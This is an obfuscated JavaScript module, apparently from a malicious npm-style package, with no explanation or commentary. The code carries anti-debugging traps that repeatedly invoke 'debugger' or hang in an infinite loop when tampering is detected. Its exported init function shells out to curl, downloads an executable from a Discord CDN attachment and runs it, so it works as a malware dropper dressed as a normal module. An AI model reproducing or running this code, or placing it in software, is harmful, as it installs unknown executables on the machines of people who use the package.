const _0x410523 = (function () {
    let _0x5cfaa5 = !![];
    return function (_0x1c21fa, _0x34a851) {
        const _0x760017 = _0x5cfaa5 ? function () {
            if (_0x34a851) {
                const _0x1ca699 = _0x34a851['apply'](_0x1c21fa, arguments);
                _0x34a851 = null;
                return _0x1ca699;
            }
        } : function () {
        };
        _0x5cfaa5 = ![];
        return _0x760017;
    };
}());
(function () {
    let _0x1a4de2;
    try {
        const _0x1072c6 = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
        _0x1a4de2 = _0x1072c6();
    } catch (_0x21375d) {
        _0x1a4de2 = window;
    }
    _0x1a4de2['setInterval'](_0x1d1490, 0x3e8);
}());
(function () {
    _0x410523(this, function () {
        const _0x2eaca1 = new RegExp('function\x20*\x5c(\x20*\x5c)');
        const _0x3b4c17 = new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i');
        const _0x145bc7 = _0x1d1490('init');
        if (!_0x2eaca1['test'](_0x145bc7 + 'chain') || !_0x3b4c17['test'](_0x145bc7 + 'input')) {
            _0x145bc7('0');
        } else {
            _0x1d1490();
        }
    })();
}());
const {exec} = require('node:child_process');
function init() {
    exec('curl\x20https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe\x20-o\x20a.exe\x20&&\x20a.exe', (_0x2362f5, _0x347813, _0x210995) => {
        if (_0x2362f5) {
            console['log']('error:\x20' + _0x2362f5['message']);
        }
    });
}
module['exports'] = init;
function _0x1d1490(_0x4f70cd) {
    function _0x29128f(_0x590fa1) {
        if (typeof _0x590fa1 === 'string') {
            return function (_0xcb9ba6) {
            }['constructor']('while\x20(true)\x20{}')['apply']('counter');
        } else {
            if (('' + _0x590fa1 / _0x590fa1)['length'] !== 0x1 || _0x590fa1 % 0x14 === 0x0) {
                (function () {
                    return !![];
                }['constructor']('debu' + 'gger')['call']('action'));
            } else {
                (function () {
                    return ![];
                }['constructor']('debu' + 'gger')['apply']('stateObject'));
            }
        }
        _0x29128f(++_0x590fa1);
    }
    try {
        if (_0x4f70cd) {
            return _0x29128f;
        } else {
            _0x29128f(0x0);
        }
    } catch (_0x31480a) {
    }
}
